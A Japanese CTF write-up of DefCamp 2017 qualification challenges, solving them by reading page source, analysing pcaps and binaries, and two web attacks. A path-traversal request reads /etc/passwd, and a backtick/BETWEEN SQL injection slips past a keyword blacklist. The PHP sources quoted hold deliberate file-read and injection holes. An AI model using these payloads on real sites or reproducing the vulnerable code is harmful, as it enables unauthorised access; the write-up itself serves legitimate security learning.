---
layout: post
title: DefCamp CTF Qualification 2017 の write-up
categories: [ctf]
date: 2017-10-02 02:57:00 +0900
---

チーム Harekaze で [DefCamp CTF Qualification 2017](https://dctf.def.camp/) に参加しました。最終的にチームで 846 点を獲得し、順位は得点 473 チーム中 25 位でした。うち、私は 8 問を解いて 245 点を入れました。

以下、解いた問題の write-up です。

## [Junior 1] Super Secure

与えられた URL にアクセスし、ソースを見ると以下のようなフォームがありました。

```html
<form name="loginform" onSubmit="return validateForm();" action="secureifnotonline.html" method="post">
	<div class="container">

		<div class="input-group">
			<span class="input-group-addon" id="basic-addon1">Username:</span>
			<!-- Oscar! this is how we will trick our attackers to only imput emails and how we will avoid future bruteforce!!!  -->

			<input type="email"  name="usr" class="form-control" placeholder="Username" aria-describedby="basic-addon1">
		</div>
	</div>
	<br>
	<div class="container">
		<div class="input-group">
			<span class="input-group-addon" id="basic-addon1">Password:</span>
			<input type="password"  name="pword" class="form-control" placeholder="Password" aria-describedby="basic-addon1">
		</div>
	</div>
	<div class="checkbox">
		<label><input type="checkbox"> Remember me</label>
	</div>
	<button type="submit" class="btn btn-default">Log in</button>
</form>
```

`/secureifnotonline.html` にアクセスし、ソースを見ると以下のように CSS を読み込んでいました。

```css
    <link rel="stylesheet" href="./ch/slide.css">
    <link rel="stylesheet" href="./ch/slide2.css">
```

`/ch/slide2.css` にアクセスするとフラグが得られました。

```css
.offline-ui.offline-ui-down.offline-ui-waiting .offline-ui-content[data-retry-in-unit="second"]:before {
  content: "DCTF{76c77d557198ff760ab9866ad1261a01a7298c349617cc4557462f80500d56a7}. Reconnecting in " attr(data-retry-in-value) " seconds...";
}
```

```
DCTF{76c77d557198ff760ab9866ad1261a01a7298c349617cc4557462f80500d56a7}
```

## [Junior 2] Is nano good?

`/?page=theme/admin/login` というような URL が与えられました。

問題名から `index.php` を nano で編集していると考えて `/index.php~` にアクセスすると、以下のようにソースが得られました。

```php
<?php
$page = $_GET["page"];
$type = $_GET["type"];
if (strpos($page, './../') !== false){
	header("Location: https://www.youtube.com/watch?v=dQw4w9WgXcQ");
	die();
}

if (strpos($page, '..././') !== false){
	header("Location: http://leekspin.com/");
	die();
}

if (strpos($page, '%') !== false){
	header("Location: http://www.nyan.cat/");
	die();
}

if (strpos($page, 'fille') !== false){
	header("Location: https://www.youtube.com/watch?v=o1eHKf-dMwo");
	die();
}

if (strpos($page, '/etc/passwd') === 0) {
	header("Location: https://www.youtube.com/watch?v=djV11Xbc914");
	die();
}
# I wonder if I can bypass path traversal restriction by going back and forward within the directorys....
if ($type == ""){
	echo file_get_contents($page.".php");
} else {
	#maybe we need something from the website 
	echo file_get_contents($page); 
}
?>
```

`/?page=//etc/passwd&type=a` にアクセスするとフラグが得られました。

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
...
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
DCTF{7569fd:x:1001:1001::/home/DCTF{7569fd:
4bf5b7ded2f:x:1002:1002::/home/4bf5b7ded2f:
c48b33a7972:x:1003:1003::/home/c48b33a7972:
c0752d13db4:x:1004:1004::/home/c0752d13db4:
32ff9930a99:x:1005:1005::/home/32ff9930a99:
6c567ea3321:x:1006:1006::/home/6c567ea3321:
13b}:x:1007:1007::/home/13b}:
```

```
DCTF{7569fd4bf5b7ded2fc48b33a7972c0752d13db432ff9930a996c567ea332113b}
```

## [Junior 2] HitandSplit

`splitandhit.pcapng` という PcapNg 形式のファイルが与えられました。

Wireshark で開いてみると、以下のような telnet の通信が複数記録されていました。

```
Welcome to the obfusctaion server. Type something and will obfuscate it!.

8
tryharder!
3
tryharder!
6
tryharder!
0
tryharder!
7
tryharder!
5
tryharder!
9
tryharder!
8
tryharder!
2
tryharder!
```

フィルターに `tcp.stream eq 11` を入力して追跡 -> TCP ストリームを選択するとフラグが得られました。

```
Welcome to the obfusctaion server. Type something and will obfuscate it!.
DCTF{71f15f9ab
0DCTF{71f15f9ab
tryharder!bd6b4f57ca1311
2bd6b4f57ca1311
tryharder!4fddef7499b34c
64fddef7499b34c
tryharder!b93b35e3ac725c
9b93b35e3ac725c
tryharder!d273ea40cb769}
5d273ea40cb769}
tryharder!thnks
5thnks
tryharder!for
8for
tryharder!your
4your
tryharder!atention
8atention
tryharder!random
8random
tryharder!stuff
3stuff
tryharder!
```

```
DCTF{71f15f9abbd6b4f57ca13114fddef7499b34cb93b35e3ac725cd273ea40cb769}
```

## [Junior 2] Loyal Book

10 個のテキストファイルが zip で与えられました。

適当に 1 つを選んで内容を検索してみると [Full text of "Sentimental education; the story of a young man"](https://archive.org/stream/sentimentaleduca00flauiala/sentimentaleduca00flauiala_djvu.txt) が元のテキストファイルであると分かりました。

元のテキストファイルと与えられたテキストファイルとの diff を見るとフラグが得られました。

```
$ diff sentimentaleduca00flauiala_djvu.txt 0001.txt

$ diff sentimentaleduca00flauiala_djvu.txt 0002.txt
2217c2217
< glimpse last summer at the Palais-Royal. Some of
---
> glimpse last summer DC at the Palais-Royal. Some of

$ diff sentimentaleduca00flauiala_djvu.txt 0003.txt
3745c3745
< benches ranged along the walls, and in the centre of
---
> benches ranged along TFthe walls, and in the centre of

$ diff sentimentaleduca00flauiala_djvu.txt 0004.txt
27559c27559
< And it must have been very strong to endure after
---
> And it must h{ave been very strong to endure after

$ diff sentimentaleduca00flauiala_djvu.txt 0005.txt
27559c27559
< And it must have been very strong to endure after
---
> And it must have been 7ba61 very strong to endure after
```

```
DCTF{7ba610cc5da3966b7c64a81c3cfcdb1b1d09e3de5ad1189268bf0e618ff71f08}
```

## [Junior 2] Inception

`Youmaynotseeme.png` という PNG ファイルが与えられました。`binwalk` に投げてみましょう。

```
$ binwalk Youmaynotseeme.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 895 x 157, 8-bit/color RGB, non-interlaced
20491         0x500B          PNG image, 895 x 157, 8-bit/color RGB, non-interlaced
40982         0xA016          PNG image, 895 x 157, 8-bit/color RGB, non-interlaced
61473         0xF021          PNG image, 895 x 157, 8-bit/color RGB, non-interlaced
81964         0x1402C         PNG image, 895 x 157, 8-bit/color RGB, non-interlaced
102455        0x19037         PNG image, 895 x 157, 8-bit/color RGB, non-interlaced
122946        0x1E042         PNG image, 876 x 159, 8-bit/color RGB, non-interlaced
148807        0x24547         PNG image, 895 x 157, 8-bit/color RGB, non-interlaced
169298        0x29552         PNG image, 895 x 157, 8-bit/color RGB, non-interlaced
189789        0x2E55D         PNG image, 895 x 157, 8-bit/color RGB, non-interlaced
210280        0x33568         PNG image, 895 x 157, 8-bit/color RGB, non-interlaced
230771        0x38573         PNG image, 895 x 157, 8-bit/color RGB, non-interlaced
251262        0x3D57E         PNG image, 895 x 157, 8-bit/color RGB, non-interlaced
```

`binwalk -D "png image:png" Youmaynotseeme.png` で展開すると `1E042.png` にフラグが書かれていました。

```
DCTF{61c9183bf4e872b61d71697891e0a451eff0b07bcd3373d4aac94aa74baccb9f}
```

## [Web 70] Are you brave enough?

与えられた URL にアクセスすると `Nop.` と表示されました。

ソースや HTTP レスポンスヘッダにはそれらしい情報がなかったので [m---/webfuck](https://github.com/m---/webfuck) を回してみると、`/index.php~` が見つかりました。

```php
<?php

$db  = mysqli_connect('localhost','web_brave','','web_brave');

$id  = @$_GET['id'];
$key = $db->real_escape_string(@$_GET['key']);

if(preg_match('/\s|[\(\)\'"\/\\=&\|1-9]|#|\/\*|into|file|case|group|order|having|limit|and|or|not|null|union|select|from|where|--/i', $id))
    die('Attack Detected. Try harder: '. $_SERVER['REMOTE_ADDR']); // attack detected

$query = "SELECT `id`,`name`,`key` FROM `users` WHERE `id` = $id AND `key` = '".$key."'";
$q = $db->query($query);

if($q->num_rows) {
    echo '<h3>Users:</h3><ul>';
    while($row = $q->fetch_array()) {
        echo '<li>'.$row['name'].'</li>';
    }

    echo '</ul>';
} else {    
    die('<h3>Nop.</h3>');
}
```

`id` で SQLi ができるようですが、`union` や `select` などが禁止されており厳しそうです。

[MySQL :: MySQL 5.6 リファレンスマニュアル :: 9.5 式の構文](https://dev.mysql.com/doc/refman/5.6/ja/expressions.html)を眺めていると `BETWEEN ... AND` という演算子を見つけました。これは使えそうです。

```
/?id=`id`between`id`&key=hoge
```

にアクセスするとフラグが得られました。

```
Users:
- Try Harder
- DCTF{602dcfeedd3aae23f05cf93d121907ec925bd70c50d78ac839ad48c0a93cfc54}
```

```
DCTF{602dcfeedd3aae23f05cf93d121907ec925bd70c50d78ac839ad48c0a93cfc54}
```

## [Revexp 162] Working Junks

`e` というファイルが与えられました。`file` に投げてみましょう。

```
$ file e
e: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=20712db5ad286fbbcfe0005d23d8cbcc3965cffa, not stripped
```

x86_64 の ELF のようです。実行してみると、以下のように 3 回入力が求められた後、謎のバイナリが出力されました。

```
$ ./e
?em wonk uoy oD !!!olleH (入力)
!sdnatsrednu eno on taht yrots gib a evah I dnA !RACIE si eman yM (入力)
!edoc ym si siht dnA (入力)
...
```

謎のバイナリを `result.bin` として保存し、`xortool -b -l 1 result.bin` を実行すると、出力された `xortool_out/048.out` に `89504e470d0a1a0a...` という文字列が含まれていました。

hex デコードするとフラグの書かれた PNG ファイルが出てきました。

```
DCTF{63a47eb3bcfade799a44e0560e891c25029e442e538276fb403975d18f93d88e}
```